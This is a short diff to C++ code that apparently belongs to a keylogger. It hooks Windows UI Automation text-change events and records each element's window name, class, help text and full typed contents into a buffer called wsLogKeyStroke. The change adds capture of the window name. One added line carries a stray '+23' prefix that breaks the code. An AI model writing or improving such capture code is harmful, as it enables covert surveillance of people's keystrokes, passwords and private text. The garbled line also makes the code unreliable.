@@ -25,7 +25,7 @@ void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElem
 	Log(L"HandleOther() Invoked", DBG);
 	BSTR bWindowName;
 	BSTR bClassName;
-	HRESULT hr;
+
 	VARIANT vValue;
 	VARIANT vHelp;
 	VariantInit(&vValue);
@@ -37,11 +37,12 @@ void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElem
 	{
 	case UIA_Text_TextChangedEventId:
 
-		//pAutomationElement->get_CurrentName(&bWindowName);
-		pAutomationElement->get_CurrentName(&bClassName);
+		pAutomationElement->get_CurrentName(&bWindowName);
+23		pAutomationElement->get_CurrentClassName(&bClassName);
 		pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleHelpPropertyId, &vHelp);
 		pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vValue);
 
+		wsLogKeyStroke += L"\n\tWindow: " + std::wstring(bWindowName);
 		wsLogKeyStroke += L"\n\tClass: " + std::wstring(bClassName);
 		wsLogKeyStroke += L"\n\tHelp: " + std::wstring(vHelp.bstrVal);
 		wsLogKeyStroke += L"\n--------------[CONTENT]--------------\n" + std::wstring(vValue.bstrVal) + L"\n--------------[CONTENT]--------------";
